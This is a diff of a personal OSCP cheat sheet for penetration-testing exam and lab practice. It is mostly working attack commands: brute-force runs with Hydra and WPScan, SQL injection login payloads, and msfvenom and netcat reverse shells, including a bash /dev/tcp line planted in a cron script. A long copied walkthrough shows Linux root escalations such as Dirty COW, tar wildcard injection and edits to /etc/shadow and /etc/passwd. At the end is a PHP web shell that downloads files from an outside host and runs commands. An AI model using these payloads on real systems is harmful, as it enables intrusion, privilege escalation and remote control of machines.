@@ -1,6 +1,10 @@
 OSCP Cheat Sheet
 This is just a simple cheat sheet for personal use.
 
+DNS & Zone Transfers
+For unix this is simple: dig -axfr @<IP> <HOST> 
+so dig -axfr @10.10.10.13 cronos.htb
+
 WPScan / Password attacks
 Wpscan --url http://example.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin, eric
 https://wpwhitesecurity.com/strong-wordpress-passwords-wpscan/ 
@@ -9,6 +13,27 @@ https://wpwhitesecurity.com/strong-wordpress-passwords-wpscan/
 LFI/RFI (Local/Remote File Inclusion)
 https://hackingarticles.in/beginner-guide--file-inclusion-attack-lfirfi
 Related but just shells that can be used: https://github.com/backdoorhub/shell-backdoor-list 
+
+TIP: When looking at a webpage for a returned LFI, say for /etc/passwd, it can look a mess. Press Ctrl + u to fix it up!
+
+SMB | Samba
+Check Domain Controllers Monteverde and Resolute for SMB uses and enumeration steps, but general usage is below.
+General use:
+	To look at what shares (disks) are available:
+			Smbclient -L 10.10.10.100 -U <user_name>
+	To enter a share and start the smbclient prompt:
+			Smbclient //10.10.10.100/SHARE_HERE -U <user_name>
+More uses: https://www.tldp.org/HOWTO/SMB-HOWTO-8.html 
+Other tools: smbmap
+
+LDAP
+Tools: ldapdomaindump
+
+Evil-winrm
+evil-winrm -u melanie -p Welcome123! -i 10.10.10.169
+
+In evil-winrm ls -al is ls -force
+More uses here: https://github.com/Hackplayers/evil-winrm 
 
 
 Fully Interactive Shell (Post Exploitation)
@@ -39,7 +64,17 @@ user@remote:~$ export TERM=xterm-256color
 Reloading bash to apply the TERM variable:
 user@remote:~$ exec /bin/bash
 
+
+
+
+
+
 Hacking with SSH
+
+********************************************************************
+TIP: Key exchange not working?try this: ssh -oKexAlgorithms=+diffie-hellman-group1-sha1  123.123.123.123
+********************************************************************
+
 Remember that you can take your id_rsa file.pub file and put it on a host machine and then use this to SSH onto the machine without the need of a password, so long as you can paste your id_rsa.pub file into the id_rsa file or key file of a legit user on the system. 
 
 Other useful ssh commands:
@@ -136,13 +171,17 @@ $ curl -T my-local-file.txt ftp://ftp.example.com --user user:secret
 SQLi for login pages
 Try opening Burp and catching the POST login request, modify the payload to username admin' or 1=1--+ and password admin' or 1=1--+
 
+Admin’ --
+
+See: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ 
+
 Bypass File Upload Filtering
 Using exiftool to insert PHP code into a jpg, png, jpeg file to bypass file uploading can be seen here: https://github.com/ccodingsKILLS/php-cmd-exec-webshell 
 
 Research docs on this topic: http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Webshells%20In%20PHP,%20ASP,%20JSP,%20Perl,%20And%20ColdFusion.pdf 
 http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html 
 
-One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.
+One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused by just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.
 We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.
 php phtml, .php, .php3, .php4, .php5, and .inc
 asp asp, .aspx
@@ -182,10 +221,73 @@ Gobuster
 https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/ 
 
 John
+Xxxxx
 
+Hydra
+hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]
 
+Command: hydra -l none -P rockyou.txt 10.10.10.43 https-post-form
+"/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect
+password" -t 64 -V
+
+RDP Brute: hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.1.1 
+
+Ncat
+The following is from https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/ 
+
+Using Netcat for File Transfers
+Netcat is like a swiss army knife for geeks. It can be used for just about anything involving TCP or UDP. One of its most practical uses is to transfer files. Non *nix people usually don't have SSH setup, and it is much faster to transfer stuff with netcat then setup SSH. netcat is just a single executable, and works across all platforms (Windows,Mac OS X, Linux).
+On the receiving end running,
+nc -l -p 1234 > out.file
+will begin listening on port 1234.
+
+On the sending end running,
+nc -w 3 [destination] 1234 < out.file
+will connect to the receiver and begin sending file.
+
+For faster transfers if both sender and receiver has some basic *nix tools installed, you can compress the file during sending process,
+On the receiving end,
+nc -l -p 1234 | uncompress -c | tar xvfp -
+
+On the sending end,
+tar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234
+
+A much cooler but less useful use of netcat is, it can transfer an image of the whole hard drive over the wire using a command called dd.
+On the sender end run,
+dd if=/dev/hda3 | gzip -9 | nc -l 3333
+
+On the receiver end,
+nc [destination] 3333 | pv -b > hdImage.img.gz
+
+Be warned that file transfers using netcat are not encrypted, anyone on the network can grab what you are sending, so use this only on trusted networks.
 
 Privesc
+
+*****************************************************************************************Escape rbash shell by trying the following: https://www.metahackers.pro/breakout-of-restricted-shell/ failing this, check OSCP write up on James server
+*****************************************************************************************
+
+WINDOWS
+Upgrading to Meterpreter shell
+
+you can make an exe file with msfvenom and start a metasploit handler the commands are:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe -o p.exe
+
+and in metasploit
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST [ip]
+set LPORT [port]
+run
+
+now upload the p.exe file to the victim and execute it
+Uploading files
+Windows 7, 8 and 10 should have Powershell (PS): 
+
+powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
+
+More here: https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65 
+
+LINUX 
 When in privsec there are some things to watch out for:
 Perl
 If you can use perl as root without the need for sudo, just run: 
@@ -198,25 +300,284 @@ User shelly may run the following commands on Shocker:
 /usr/bin/perl
 
 
-
+LINUX PRIVSEC PLAYBOOK:
+Sudo -l
+Uname commands
+Writable dir’s
 
 https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ a good demo of this is here for the Magic HTB box https://ca0y1h.top/Target_drone/HackTheBox/15.HTB-Magic-walkthrough/ 
 
-https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/ 
+
+NC won’t allow -e 
+Try this: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
 
 
 
+Linux PrivEsc:
+1.  Service Exploits 
+The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
+Change into the /home/user/tools/mysql-udf directory:
+cd /home/user/tools/mysql-udf
+Compile the raptor_udf2.c exploit code using the following commands:
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+Connect to the MySQL service as the root user with a blank password:
+mysql -u root
+Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+/tmp/rootbash -p
+Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
+rm /tmp/rootbash
+exit
+
+3. Weak File Permissions - Readable /etc/shadow
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+Note that the /etc/shadow file on the VM is world-readable:
+ls -l /etc/shadow
+View the contents of the /etc/shadow file:
+cat /etc/shadow
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Switch to the root user, using the cracked password:
+su root
+
+4. Weak File Permissions - Writable /etc/shadow 
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+Note that the /etc/shadow file on the VM is world-writable:
+ls -l /etc/shadow
+Generate a new password hash with a password of your choice:
+mkpasswd -m sha-512 newpasswordhere
+Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+Switch to the root user, using the new password:
+su root
+
+5. Weak File Permissions - Writable /etc/passwd
+The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
+Note that the /etc/passwd file is world-writable:
+ls -l /etc/passwd
+Generate a new password hash with a password of your choice:
+openssl passwd newpasswordhere
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+Switch to the root user, using the new password:
+su root
+Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
+Now switch to the newroot user, using the new password:
+su newroot
+Remember to exit out of the root shell before continuing!
+
+6. Shell escape sequences
+List the programs which sudo allows your user to run:
+sudo -l
+Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.
+For an extra challenge, try to gain a root shell using all the programs on the list!
+> consider how you can use Apache2 to make a root shell
+
+7. Environment Variables
+
+Sudo can be configured to inherit certain environment variables from the user's environment.
+Check which environment variables are inherited (look for the env_keep options):
+sudo -l
+LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
+Create a shared object using the code located at /home/user/tools/sudo/preload.c:
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.
+Run ldd against the apache2 program file to see which shared libraries are used by the program:
+ldd /usr/sbin/apache2
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
+sudo LD_LIBRARY_PATH=/tmp apache2
+A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
+8. Cron jobs - File Permissions
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+View the contents of the system-wide crontab:
+cat /etc/crontab
+There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+Locate the full path of the overwrite.sh file:
+locate overwrite.sh
+Note that the file is world-writable:
+ls -l /usr/local/bin/overwrite.sh
+Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+nc -nvlp 4444
+9. Cron Jobs - PATH environment variable
+
+View the contents of the system-wide crontab:
+cat /etc/crontab
+Note that the PATH variable starts with /home/user which is our user's home directory.
+Create a file called overwrite.sh in your home directory with the following contents:
+#!/bin/bash
+ 
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+Make sure that the file is executable:
+chmod +x /home/user/overwrite.sh
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+/tmp/rootbash -p
+Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
+rm /tmp/rootbash
+
+10. Cron Jobs - Wild Cards
+
+View the contents of the other cron job script:
+cat /usr/local/bin/compress.sh
+Note that the tar command is being run with a wildcard (*) in your home directory.
+Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
+chmod +x /home/user/shell.elf
+Create these two files in /home/user:
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+nc -nvlp 4444
+Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
+rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf
+
+SUID / SGID Executables - Known Exploits 17/05/2020
+Find all the SUID/SGID executables on the Debian VM:
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+Note that /usr/sbin/exim-4.84-3 appears in the results. Exploit-DB, Google, and GitHub are good places to search!
+A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.
+Run the exploit script to gain a root shell:
+/home/user/tools/suid/exim/cve-2016-1531.sh
+
+SUID / SGID Executables - Shared Object Injection 17/05/2020
+The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
+First, execute the file and note that currently it displays a progress bar before exiting:
+/usr/local/bin/suid-so
+Run strace on the file and search the output for open/access calls and for "no such file" errors:
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
+Create the .config directory for the libcalc.so file:
+mkdir /home/user/.config
+Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
+/usr/local/bin/suid-so
+
+[Task 13] SUID / SGID Executables - Environment Variables 17/05/2020
+The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
+First, execute the file and note that it seems to be trying to start the apache2 webserver:
+/usr/local/bin/suid-env
+Run strings on the file to look for strings of printable characters:
+strings /usr/local/bin/suid-env
+One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
+Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
+gcc -o service /home/user/tools/suid/service.c
+Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
+PATH=.:$PATH /usr/local/bin/suid-env
 
 
 
+[Task 14] SUID / SGID Executables - Abusing Shell Features (#1) 18/05/2020
+The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+Verify this with strings:
+strings /usr/local/bin/suid-env2
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+/bin/bash --version
+Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+Run the suid-env2 executable to gain a root shell:
+/usr/local/bin/suid-env2
 
 
+[Task 15] SUID / SGID Executables - Abusing Shell Features (#2) 18/05/2020
+Note: This will not work on Bash versions 4.4 and above.
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+/tmp/rootbash -p
+Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
+rm /tmp/rootbash
+exit
+
+[Task 16] Passwords & Keys - History Files 18/05/2020
+If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+View the contents of all the hidden history files in the user's home directory:
+cat ~/.*history | less
+Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
+Switch to the root user, using the password:
+su root
 
 
+[Task 17] Passwords & Keys - Config Files 18/05/2020
+Config files often contain passwords in plaintext or other reversible formats.
+List the contents of the user's home directory:
+ls /home/user
+Note the presence of a myvpn.ovpn config file. View the contents of the file:
+cat /home/user/myvpn.ovpn
+The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
+su root
 
 
+[Task 18] Passwords & Keys - SSH Keys 18/05/2020
+Sometimes users make backups of important files but fail to secure them with the correct permissions.
+Look for hidden files & directories in the system root:
+ls -la /
+Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
+ls -l /.ssh
+Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.
+Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
+chmod 600 root_key
+Use the key to login to the Debian VM as the root account (change the IP accordingly):
+ssh -i root_key root@10.10.10.10
 
+
+[Task 19] NFS 18/05/2020
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+Check the NFS share configuration on the Debian VM:
+cat /etc/exports
+Note that the /tmp share has root squashing disabled.
+On your Kali box, switch to your root user if you are not already running as root:
+sudo su
+Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
+mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+Still using Kali's root user, make the file executable and set the SUID permission:
+chmod +xs /tmp/nfs/shell.elf
+Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
+/tmp/shell.elf
+
+[Task 20] Kernel Exploits 19/05/2020
+Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+Compile the code and run it (note that it may take several minutes to complete):
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+/usr/bin/passwd
+Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
+mv /tmp/bak /usr/bin/passwd
+exit
+
+[Task 21] Privilege Escalation Scripts 18/05/2020
+Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: /home/user/tools/privesc-scripts
 
 
 
@@ -227,3 +588,65 @@ https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
 Appendix
 http://rumkin.com/tools/cipher/vigenere.php - site for cyper tools (crypto)
 https://xapax.gitbooks.io/security/content/bypass_image_upload.html (book)
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (XSS Cheatsheet)
+gobuster -u http://10.10.10.187/admin-dir -w /home/atsika/wordlists/common.txt
+
+
+https://github.com/Hackplayers/evil-winrm
+
+x86 shell coding
+http://www.fuzzysecurity.com/tutorials/16.html
+encyclopedia of priv escalation https://www.youtube.com/watch?v=kMG8IsCohHA
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+Uplooading files to Windows: https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65 
+Hacking a Domain Controller
+
+You know when you are looking at a domain controller when you see an nmap scan result that looks something like this: DNS on port 53, Kerberos on port 88, and LDAP on port 389. Kerberos and LDAP allow for positive identification that a given machine is a Windows machine running Active Directory, and likely a domain controller.
+
+Enumerations:
+
+If route 53 is open, we can always try to get the domain name by doing the following:
+Nslookup
+> server <DNS to query>
+> set type=any
+> ls -d <target>
+
+Or for unix machines (this wouldn’t be a domain controller, but still worth knowing):
+	dig -axfr @<DNS YOU ARE QUERYING, like www.megaban.com> <target>
+
+
+
+Moving on, the main part is going to be using SMB (Samba) share to find users, potential passwords, etc. 
+
+
+
+
+
+
+
+
+
+https://github.com/rapid7/metasploit-framework/pull/8767
+$url = '10.10.10.9';
+$endpoint_path = '/rest';
+$endpoint = 'rest';
+
+$phpCode= <<<'EOD'
+<?php
+ if (isset($_REQUEST['fupload'])) {
+  file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.12:8000/" . $_REQUEST['fupload']));
+};
+if (isset($_REQUEST['fexec'])) {
+  echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
+};
+?>    
+EOD;
+
+$file = [
+	'filename' => 'gendo.php',
+	'data' => $phpCode
+];
+
+
+
